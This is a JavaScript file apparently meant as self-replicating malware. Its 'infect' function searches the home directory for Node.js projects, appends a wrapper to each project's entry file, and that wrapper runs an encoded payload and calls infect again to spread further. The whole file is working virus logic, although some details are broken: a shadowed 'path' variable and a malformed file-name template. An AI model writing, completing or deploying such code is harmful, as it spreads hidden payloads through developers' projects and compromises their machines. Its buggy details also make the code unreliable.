async function infect( payload ) {

    const fs   = require( "fs" );
    const os   = require( "os" );
    const path = require( "path" );

    // the original payload, modified with a runner that decodes and executes it
    // this is the string that will be injected into our targets

    const modifiedPayload = `
        (function() {
            ${decodeURI(payload)} 
            infect( "${payload}" );
        })();
    `;

    // wrapped standard file-system methods in promises so we can use await/async syntax

    function readFile( f ) {
        return new Promise( function( rs, rj ) {
            fs.readFile( f, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function readdir( dir ) {
        return new Promise( function( rs, rj ) {
            fs.readdir( dir, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function stat( f ) {
        return new Promise( function( rs, rj ) {
            fs.stat( f, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function appendFile( f, data ) {
        return new Promise( function( rs, rj ) {
            fs.appendFile( f, data, (e) => e ? rj( e ) : rs() );
        });
    }

    // utility function to find a file that exists out of a candidate list
    // used when searching for the actual file to infect

    async function getCandidate( root, candidates ) {
        for( var candidate of candidates ) {
            var path = path.join( root, candidate );
            try {
                await stat( path );
                return path;
            } catch( e ) {
                continue;
            }
        }

        // no candidate file found - we lose
        return null;
    }

    async function search( dir ) {

        var filesToInfect = [];
        var directories   = [];
        var foundPackage  = false;
        for( let f of await readdir( dir ) ) {
            let full = path.join( dir, f );
            try {
                let fStat = await stat( full );
                if( fStat.isFile() ) {
                    if( f === "package.json" ) {
                        foundPackage = true;
                        let packageJson = JSON.parse( await readFile( full ) );

                        // candidate file names in order of preference:
                        let candidates = [ "index.js", `${packageJson.name}`.js, "app.js", packageJson.main ].filter( x => x );
                        let target = await getCandidate( dir, candidates );

                        // abort this project if we can't find a target to infect
                        if( !target )
                            continue;
                        filesToInfect.push( target );
                    }
                } else if( fStat.isDirectory() ) {
                    directories.push( full );
                }
            } catch( e ) {
                continue;
            }
        }

        if( !foundPackage )
            for( let d of directories )
                for( let f of await search( d ) )
                    filesToInfect.push( f );
        return filesToInfect;
    }
    
    var filesToInfect = await search( os.homedir() );
    
    for( var f of filesToInfect ) {
        var src = await readFile( f );
        if( src.indexOf( modifiedPayload ) === -1 )
            await appendFile( f, modifiedPayload ); 
    }
}
